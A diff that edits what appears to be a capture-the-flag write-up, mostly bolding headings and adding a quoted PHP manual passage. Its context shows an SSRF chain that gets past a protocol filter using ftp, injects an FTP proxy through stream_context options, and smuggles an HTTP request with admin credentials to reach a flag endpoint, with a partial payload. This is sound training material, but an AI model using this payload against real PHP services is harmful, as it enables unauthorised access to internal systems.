@@ -889,7 +889,7 @@ if(isset($_POST['hello']))
 ```
 
 Let's dive into the code analysis.
-1. About input handling and filtering:
+**1. About input handling and filtering:**
 ```php
 $protocol = (isset($_SESSION['protocol']) && !preg_match('/http|file/i', $_SESSION['protocol'])) ? $_SESSION['protocol'] : null;
 ```
@@ -899,7 +899,7 @@ $protocol = (isset($_SESSION['protocol']) && !preg_match('/http|file/i', $_SESSI
 
 So we can use `ftp` protocol with proxy option to redirect requests.
 
-2. About `stream_context_create`:
+**2. About `stream_context_create`:**
 ```php
 $context = stream_context_create(json_decode($options, true));
 ```
@@ -908,7 +908,7 @@ $context = stream_context_create(json_decode($options, true));
 
 We can inject FTP proxy settings to redirect requests to internal web service.
 
-3. For the HTTP request:
+**3. For the HTTP request:**
 ```php
 $resp = @fopen("$protocol://127.0.0.1:3000/$name", 'r', false, $context);
 ```
@@ -928,7 +928,7 @@ username=admin&hello=a&protocol=ftp://a/flag?&options={"ftp":{"proxy":"tcp://web
 ```
 
 Let's explain details:
-1. For the request smuggling part:
+**1. For the request smuggling part:**
 ```
 aaa HTTP/1.1
 Host: a
@@ -939,14 +939,14 @@ password: admin
 - Creates new HTTP request inside name parameter
 - Injects authentication headers
 
-2. For the proxy settings:
+**2. For the proxy settings:**
 ```
 protocol=ftp://a/flag?
 ```
 - Uses FTP to bypass protocol filter
 - Points to flag endpoint
 
-3. About stream options:
+**3. About stream options:**
 ```json
 {
     "ftp":{
@@ -955,6 +955,19 @@ protocol=ftp://a/flag?
 }
 ```
 - Injects proxy settings to redirect requests to internal web service.
+
+To know why we use thus stream options is that: <br>
+From this article: https://www.php.net/manual/en/context.ftp.php <br>
+There is a statement that says:
+```
+FTP context options:
+proxy string - Proxy FTP request via http proxy server
+Example format: tcp://squid.example.com:8000
+```
+- Requires specific format for FTP context options
+- Must use `ftp` as top-level key
+- `proxy` is the official option name
+- Must use `tcp://` format
 
 Here is the workflow exploit:
 1. Send crafted POST request with payload
